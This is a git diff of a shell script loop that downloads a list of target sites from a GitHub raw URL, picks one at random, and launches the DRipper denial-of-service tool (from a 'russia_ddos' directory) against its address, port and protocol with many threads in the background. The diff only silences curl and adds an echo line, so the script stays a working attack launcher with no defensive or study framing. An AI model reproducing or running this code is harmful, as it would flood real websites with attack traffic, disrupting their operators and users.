@@ -22,12 +22,13 @@ do
         do
         
              # Get random line from list of targets. First 5 lines ommited
-             site=$(curl https://raw.githubusercontent.com/KarboDuck/karbo-wiki/master/DRipper_targets | tail -n +6 | shuf -n 1)
+             site=$(curl -s https://raw.githubusercontent.com/KarboDuck/karbo-wiki/master/DRipper_targets | tail -n +6 | shuf -n 1)
              
              # Get site address, port and protocol from the line (1, 2 and 3 'collumn')
              addr=$(echo $site | awk '{print $1}')
              port=$(echo $site | awk '{print $2}')
              prot=$(echo $site | awk '{print $3}')
+             echo $site $port $prot
              
              # Launch DRipper to attack site choosen above
              python3 -u ~/russia_ddos/DRipper.py -l 2048 -s $addr -p $port -m $prot -t 50&
